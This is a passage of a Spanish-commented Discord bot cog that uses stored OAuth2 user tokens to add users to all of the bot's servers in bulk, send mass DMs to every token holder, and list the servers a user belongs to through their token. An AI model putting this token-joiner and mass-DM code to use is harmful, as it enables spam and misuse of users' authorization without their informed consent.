                    await progress.edit(
                        embed=_embed_progreso(i + 1, len(miembros), f"⏳ {rol.name}...", f"✅ {ok}  ❌ {fail}")
                    )
                await asyncio.sleep(0.5)

        await interaction.followup.send(
            embed=discord.Embed(
                title="📊 Completado",
                description=f"{rol.mention}\n✅ {ok} añadidos  ❌ {fail} errores",
                color=discord.Color.green() if fail == 0 else discord.Color.orange(),
                timestamp=datetime.now(timezone.utc),
            ),
            ephemeral=True,
        )

    @app_commands.command(name="unir-red", description="[Admin] Añade un usuario a TODOS los servidores del bot.")
    @app_commands.describe(usuario="Usuario.")
    @app_commands.checks.has_permissions(administrator=True)
    async def unir_red(self, interaction: discord.Interaction, usuario: discord.Member):
        await interaction.response.defer(ephemeral=True)
        if not token_store.get_user(usuario.id):
            await interaction.followup.send(f"❌ {usuario.mention} no tiene token.", ephemeral=True)
            return

        guilds = [g for g in self.bot.guilds if g.id != interaction.guild.id]
        if not guilds:
            await interaction.followup.send("⚠️ El bot no está en otros servidores.", ephemeral=True)
            return

        progress = await interaction.followup.send(
            embed=_embed_progreso(0, len(guilds), f"⏳ Añadiendo {usuario.display_name} a la red..."),
            ephemeral=True,
        )
        resultados = []
        async with aiohttp.ClientSession() as session:
            for i, g in enumerate(guilds):
                ok, msg = await utils.add_to_guild(usuario.id, g.id, session=session)
                resultados.append(f"{'✅' if ok else '❌'} **{g.name}** — {msg}")
                if i % 3 == 0 or i == len(guilds) - 1:
                    await progress.edit(
                        embed=_embed_progreso(i + 1, len(guilds), "⏳ Añadiendo a la red...")
                    )
                await asyncio.sleep(0.5)

        embed = discord.Embed(
            title=f"🌐 {usuario.display_name} — Resultado",
            description="\n".join(resultados),
            color=discord.Color.blurple(),
            timestamp=datetime.now(timezone.utc),
        )
        embed.set_thumbnail(url=usuario.display_avatar.url)
        await interaction.followup.send(embed=embed, ephemeral=True)

    @app_commands.command(name="sincronizar-red", description="[Admin] Añade TODOS los tokens a TODOS los servidores del bot.")
    @app_commands.checks.has_permissions(administrator=True)
    async def sincronizar_red(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        tokens = token_store.get_valid()
        guilds = [g for g in self.bot.guilds if g.id != interaction.guild.id]

        if not tokens:
            await interaction.followup.send("⚠️ No hay tokens válidos.", ephemeral=True)
            return
        if not guilds:
            await interaction.followup.send("⚠️ El bot no está en otros servidores.", ephemeral=True)
            return

        total   = len(tokens) * len(guilds)
        confirm = ConfirmarView(interaction.user.id)
        await interaction.followup.send(
            embed=discord.Embed(
                title="⚠️ Sincronización masiva",
                description=(
                    f"**{len(tokens)}** usuarios × **{len(guilds)}** servidores = **{total} operaciones**\n\n"
                    "⚠️ Esta es la operación más intensa. ¿Confirmar?"
                ),
                color=discord.Color.red(),
            ),
            view=confirm, ephemeral=True,
        )
        await confirm.wait()
        if not confirm.confirmed:
            return

        progress = await interaction.followup.send(
            embed=_embed_progreso(0, total, "⏳ Sincronizando red..."), ephemeral=True
        )
        ok = fail = done = 0
        async with aiohttp.ClientSession() as session:
            for uid in tokens:
                for g in guilds:
                    exito, _ = await utils.add_to_guild(int(uid), g.id, session=session)
                    if exito: ok += 1
                    else:     fail += 1
                    done += 1
                    if done % 10 == 0 or done == total:
                        await progress.edit(
                            embed=_embed_progreso(done, total, "⏳ Sincronizando...", f"✅ {ok}  ❌ {fail}")
                        )
                    await asyncio.sleep(0.5)

        log.info(f"sincronizar-red: {ok} OK, {fail} errores, {total} ops")
        await interaction.followup.send(
            embed=discord.Embed(
                title="✅ Sincronización completada",
                description=f"✅ Exitosas: {ok}\n❌ Errores: {fail}\n📊 Total: {total} ops",
                color=discord.Color.green() if fail == 0 else discord.Color.orange(),
                timestamp=datetime.now(timezone.utc),
            ),
            ephemeral=True,
        )

    # ══════════════════════════════════════════════════════════════════════════
    #  MENSAJES
    # ══════════════════════════════════════════════════════════════════════════

    @app_commands.command(name="mensaje-canal", description="[Admin] Envía un mensaje de texto a un canal de otro servidor.")
    @app_commands.describe(servidor_id="ID del servidor.", canal_id="ID del canal.", texto="Mensaje a enviar.")
    @app_commands.checks.has_permissions(administrator=True)
    async def mensaje_canal(self, interaction: discord.Interaction, servidor_id: str, canal_id: str, texto: str):
        await interaction.response.defer(ephemeral=True)
        try:
            guild = self.bot.get_guild(int(servidor_id))
            canal = guild.get_channel(int(canal_id)) if guild else None
        except ValueError:
            await interaction.followup.send("❌ IDs inválidos.", ephemeral=True)
            return
        if not guild:
            await interaction.followup.send("❌ El bot no está en ese servidor.", ephemeral=True)
            return
        if not canal or not isinstance(canal, discord.TextChannel):
            await interaction.followup.send("❌ Canal no encontrado o no es de texto.", ephemeral=True)
            return
        try:
            await canal.send(texto)
            await interaction.followup.send(
                f"✅ Mensaje enviado en **{guild.name}** → `#{canal.name}`", ephemeral=True
            )
        except discord.Forbidden:
            await interaction.followup.send("❌ Sin permisos para escribir en ese canal.", ephemeral=True)

    @app_commands.command(name="anuncio-red", description="[Admin] Envía un embed a un canal de otro servidor.")
    @app_commands.describe(
        servidor_id="ID del servidor.", canal_id="ID del canal.",
        titulo="Título.", descripcion="Descripción.", color="Color hex (ej: ff0000). Por defecto: azul Discord."
    )
    @app_commands.checks.has_permissions(administrator=True)
    async def anuncio_red(
        self,
        interaction: discord.Interaction,
        servidor_id: str, canal_id: str,
        titulo: str, descripcion: str, color: str | None = None,
    ):
        await interaction.response.defer(ephemeral=True)
        try:
            guild = self.bot.get_guild(int(servidor_id))
            canal = guild.get_channel(int(canal_id)) if guild else None
        except ValueError:
            await interaction.followup.send("❌ IDs inválidos.", ephemeral=True)
            return
        if not guild or not canal or not isinstance(canal, discord.TextChannel):
            await interaction.followup.send("❌ Servidor o canal no encontrado.", ephemeral=True)
            return
        try:
            hex_c = int((color or "5865f2").lstrip("#"), 16)
        except ValueError:
            hex_c = 0x5865F2
        embed = discord.Embed(
            title=titulo, description=descripcion, color=hex_c,
            timestamp=datetime.now(timezone.utc),
        )
        embed.set_footer(text=f"Enviado desde {interaction.guild.name}")
        try:
            await canal.send(embed=embed)
            await interaction.followup.send(
                f"✅ Anuncio enviado en **{guild.name}** → `#{canal.name}`", ephemeral=True
            )
        except discord.Forbidden:
            await interaction.followup.send("❌ Sin permisos para escribir.", ephemeral=True)

    @app_commands.command(name="dm-masivo", description="[Admin] Envía un DM a todos los usuarios con token válido.")
    @app_commands.describe(mensaje="Mensaje.", titulo="Título del embed (opcional, si no se especifica va como texto).")
    @app_commands.checks.has_permissions(administrator=True)
    async def dm_masivo(self, interaction: discord.Interaction, mensaje: str, titulo: str | None = None):
        await interaction.response.defer(ephemeral=True)
        validos = token_store.get_valid()
        if not validos:
            await interaction.followup.send("⚠️ No hay tokens válidos.", ephemeral=True)
            return

        confirm = ConfirmarView(interaction.user.id)
        await interaction.followup.send(
            embed=discord.Embed(
                title="⚠️ DM masivo",
                description=f"Se enviará un DM a **{len(validos)} usuarios**. ¿Confirmar?",
                color=discord.Color.orange(),
            ),
            view=confirm, ephemeral=True,
        )
        await confirm.wait()
        if not confirm.confirmed:
            return

        progress = await interaction.followup.send(
            embed=_embed_progreso(0, len(validos), "⏳ Enviando DMs..."), ephemeral=True
        )
        enviados = fallidos = 0
        uids = list(validos.keys())
        for i, uid in enumerate(uids):
            try:
                user = await self.bot.fetch_user(int(uid))
                if titulo:
                    await user.send(embed=discord.Embed(
                        title=titulo, description=mensaje,
                        color=discord.Color.blurple(), timestamp=datetime.now(timezone.utc),
                    ))
                else:
                    await user.send(mensaje)
                enviados += 1
            except Exception:
                fallidos += 1
            if i % 5 == 0 or i == len(uids) - 1:
                await progress.edit(
                    embed=_embed_progreso(i + 1, len(uids), "⏳ Enviando DMs...", f"✅ {enviados}  ❌ {fallidos}")
                )
            await asyncio.sleep(0.5)

        await interaction.followup.send(
            embed=discord.Embed(
                title="📨 DM masivo completado",
                description=f"✅ Enviados: {enviados}\n❌ Fallidos: {fallidos}",
                color=discord.Color.green(),
                timestamp=datetime.now(timezone.utc),
            ),
            ephemeral=True,
        )

    @app_commands.command(name="dm-servidor", description="[Admin] DM a todos los usuarios con token en un servidor concreto.")
    @app_commands.describe(servidor_id="ID del servidor.", mensaje="Mensaje.")
    @app_commands.checks.has_permissions(administrator=True)
    async def dm_servidor(self, interaction: discord.Interaction, servidor_id: str, mensaje: str):
        await interaction.response.defer(ephemeral=True)
        try:
            gid   = int(servidor_id)
            guild = self.bot.get_guild(gid)
        except ValueError:
            await interaction.followup.send("❌ ID inválido.", ephemeral=True)
            return
        if not guild:
            await interaction.followup.send("❌ El bot no está en ese servidor.", ephemeral=True)
            return

        ids_srv = {str(m.id) for m in guild.members if not m.bot}
        targets = {k: v for k, v in token_store.get_valid().items() if k in ids_srv}
        if not targets:
            await interaction.followup.send(
                f"⚠️ No hay usuarios con token en **{guild.name}**.", ephemeral=True
            )
            return

        progress = await interaction.followup.send(
            embed=_embed_progreso(0, len(targets), f"⏳ DMs en {guild.name}..."), ephemeral=True
        )
        enviados = fallidos = 0
        for i, uid in enumerate(targets):
            try:
                user = await self.bot.fetch_user(int(uid))
                await user.send(mensaje)
                enviados += 1
            except Exception:
                fallidos += 1
            if i % 5 == 0 or i == len(targets) - 1:
                await progress.edit(
                    embed=_embed_progreso(i + 1, len(targets), f"⏳ DMs en {guild.name}...", f"✅ {enviados}  ❌ {fallidos}")
                )
            await asyncio.sleep(0.5)

        await interaction.followup.send(
            embed=discord.Embed(
                title=f"📨 DMs en {guild.name}",
                description=f"✅ {enviados} enviados  ❌ {fallidos} fallidos",
                color=discord.Color.green(),
                timestamp=datetime.now(timezone.utc),
            ),
            ephemeral=True,
        )

    # ══════════════════════════════════════════════════════════════════════════
    #  INFO DE RED
    # ══════════════════════════════════════════════════════════════════════════

    @app_commands.command(name="mis-servidores", description="[Admin] Lista todos los servidores donde está el bot.")
    @app_commands.checks.has_permissions(administrator=True)
    async def mis_servidores(self, interaction: discord.Interaction):
        guilds = sorted(self.bot.guilds, key=lambda g: g.member_count, reverse=True)
        embed  = discord.Embed(
            title=f"🌐 Servidores del bot — {len(guilds)}",
            color=discord.Color.blurple(),
            timestamp=datetime.now(timezone.utc),
        )
        for g in guilds[:25]:
            embed.add_field(name=g.name, value=f"`{g.id}`\n👥 {g.member_count}", inline=True)
        if len(guilds) > 25:
            embed.set_footer(text=f"Mostrando 25 de {len(guilds)}")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="guilds-usuario", description="[Admin] Servidores donde está un usuario (vía token OAuth2).")
    @app_commands.describe(usuario="Usuario.")
    @app_commands.checks.has_permissions(administrator=True)
    async def guilds_usuario(self, interaction: discord.Interaction, usuario: discord.Member):
        await interaction.response.defer(ephemeral=True)
        token = await utils.valid_token(usuario.id)
        if not token:
            await interaction.followup.send(f"❌ {usuario.mention} no tiene token válido.", ephemeral=True)
            return

        guilds = await utils.get_user_guilds(token)
        if not guilds:
            await interaction.followup.send(
                "⚠️ No se pudieron obtener los servidores. El token puede no tener el scope `guilds`.",
                ephemeral=True,
            )
            return

        bot_ids = {g.id for g in self.bot.guilds}
        embed   = discord.Embed(
            title=f"🌐 Servidores de {usuario.display_name} ({len(guilds)})",
            color=discord.Color.blurple(),
            timestamp=datetime.now(timezone.utc),
        )
        embed.set_thumbnail(url=usuario.display_avatar.url)
        for g in guilds[:24]:
            en_bot = " 🤖" if int(g["id"]) in bot_ids else ""
            embed.add_field(name=f"{g['name']}{en_bot}", value=f"`{g['id']}`", inline=True)
        embed.set_footer(text="🤖 = el bot también está ahí")
        await interaction.followup.send(embed=embed, ephemeral=True)

    @app_commands.command(name="mapa-tokens", description="[Admin] Muestra cuántos tokens hay en cada servidor.")
    @app_commands.checks.has_permissions(administrator=True)
    async def mapa_tokens(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        token_ids = {int(k) for k in token_store.get_valid()}
        if not token_ids:
            await interaction.followup.send("⚠️ No hay tokens válidos.", ephemeral=True)
            return

        guilds = sorted(self.bot.guilds, key=lambda g: g.member_count, reverse=True)
        total  = len(token_ids)
        filas  = []
        for g in guilds:
            ids_g   = {m.id for m in g.members if not m.bot}
            comunes = len(token_ids & ids_g)
            pct     = int(comunes / total * 100) if total else 0
            filas.append((g.name, comunes, pct, g.id))
        filas.sort(key=lambda x: x[1], reverse=True)

        embed = discord.Embed(
            title="🗺️ Tokens por servidor",
            color=discord.Color.blurple(),
            timestamp=datetime.now(timezone.utc),
        )
        for nombre, n, pct, gid in filas[:20]:
            embed.add_field(
                name=nombre,
                value=f"`{_barra(n, total, 10)}` **{n}** ({pct}%)\n`{gid}`",
                inline=True,
            )
        embed.set_footer(text=f"Total tokens válidos: {total}")
        await interaction.followup.send(embed=embed, ephemeral=True)


async def setup(bot: commands.Bot):
    await bot.add_cog(Tokens(bot))
